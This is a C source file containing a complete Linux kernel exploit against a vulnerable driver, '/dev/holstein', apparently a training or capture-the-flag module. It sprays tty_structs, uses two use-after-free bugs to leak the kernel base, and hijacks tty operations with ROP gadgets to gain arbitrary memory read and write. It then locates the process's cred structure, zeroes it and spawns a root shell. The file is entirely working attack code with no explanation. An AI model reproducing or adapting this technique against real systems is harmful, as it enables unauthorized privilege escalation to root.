#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <poll.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/prctl.h>
#include <unistd.h>

#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/mount.h>
#include <sys/msg.h>
#include <sys/shm.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/utsname.h>

typedef uint8_t u8;
typedef uint16_t u16;
typedef uint32_t u32;
typedef uint64_t u64;

typedef int8_t i8;
typedef int16_t i16;
typedef int32_t i32;
typedef int64_t i64;

#define ofs_tty_ops 0xc39c60
#define spray_num 100
#define dev_vuln "/dev/holstein"
#define mov_ptr_rdx_rcx_ret (kbase + 0x1b2d06)
#define mov_eax_ptr_rdx_ret (kbase + 0x4469e8)
u64 kbase;
u64 g_buf;
i32 fd1, fd2, fd3, fd4;
i32 spray[spray_num];
char buf[0x500];
void fatal(char *msg) {
  perror(msg);
  exit(-1);
}

int check_aaw = -1;
int check_aar = -1;
void aaw(u64 addr, u32 val) {
  printf("aww: val 0x%x at addr 0x%lx\n", val, addr);
  if (check_aaw == -1) {
    read(fd4, buf, 0x400);
    *(u64 *)&buf[0x18] = g_buf + 0x3f0 - 12 * 8;
    write(fd4, buf, 0x20);
    for (int i = spray_num / 2; i < spray_num; i++) {
      int v = ioctl(spray[i], val, addr);
      if (v != -1) {
        printf("found tty_struct at idx: %d\n", i);
        check_aaw = spray[i];
        break;
      }
    }
  } else {
    ioctl(check_aaw, val, addr);
  }
}
u32 aar(u64 addr) {
  if (check_aar == -1) {
    read(fd4, buf, 0x400);
    *(u64 *)&buf[0x18] = g_buf + 0x3f8 - 12 * 8;
    write(fd4, buf, 0x20);

    for (int i = spray_num / 2; i < spray_num; i++) {
      int v = ioctl(spray[i], 0, addr /* rdx */);
      if (v != -1) {
        check_aar = spray[i];
        return v;
      }
    }
  } else
    return ioctl(check_aar, 0, addr);
}

int main() {
  puts("open 1 2 and close 1 -> uaf1");
  fd1 = open("/dev/holstein", O_RDWR);
  fd2 = open("/dev/holstein", O_RDWR);
  close(fd1);
  puts("spayinggg !!!");
  for (int i = 0; i < spray_num / 2; i++) {
    spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
    if (spray[i] < 0) {
      fatal("cuts");
    }
  }
  puts("prepare leak!!!");
  read(fd2, buf, 0x400); // read tty_struct
  kbase = *(u64 *)&buf[0x18] - ofs_tty_ops;
  g_buf = *(u64 *)&buf[0x38] - 0x38;
  printf("[+] kbase: 0x%lx\n", kbase);
  printf("[+] gbuf: 0x%lx\n", g_buf);
  printf("preparing rop chain \n");
  if ((g_buf & 0xffffffff00000000) == 0xffffffff00000000) {
    printf("[-] heap spraying failed\n");
    for (int i = 0; i < spray_num / 2; i++)
      close(spray[i]);
    exit(-1);
  }
  *(u64 *)&buf[0x3f0] = mov_ptr_rdx_rcx_ret;
  *(u64 *)&buf[0x3f8] = mov_eax_ptr_rdx_ret;

  printf("overwriting tty_struct -> gadget\n");
  write(fd2, buf, 0x400);

  puts("uaf2");
  fd3 = open("/dev/holstein", O_RDWR);
  fd4 = open("/dev/holstein", O_RDWR);
  if (fd3 < 1 || fd4 < 1) {
    fatal("cuts");
  }
  close(fd3);
  puts("spraying uaf2");
  for (int i = spray_num / 2; i < spray_num; i++) {
    spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
    if (spray[i] < 0) {
      fatal("cuts");
    }
  }
  puts("[+] change comm");
  if (prctl(PR_SET_NAME, "aptx4869") != 0)
    fatal("prctl");
  u64 addr;
  for (addr = g_buf - 0x1000000;; addr += 0x8) {
    if ((addr & 0xfffff) == 0)
      printf("[*] searching for comm at 0x%lx\n", addr);

    if (aar(addr) == 0x78747061 && aar(addr + 4) == 0x39363834) {
      printf("[+] comm found at 0x%lx\n", addr);
      break;
    }
  }
  u64 addr_cred = 0;
  addr_cred |= aar(addr - 8);
  addr_cred |= (u64)aar(addr - 4) << 32;
  puts("[*] overwrite cred to root");
  for (int i = 1; i < 9; i++)
    aaw(addr_cred + i * 4, 0);

  puts("[*] spawning root shell");
  system("/bin/sh");

  return 0;
}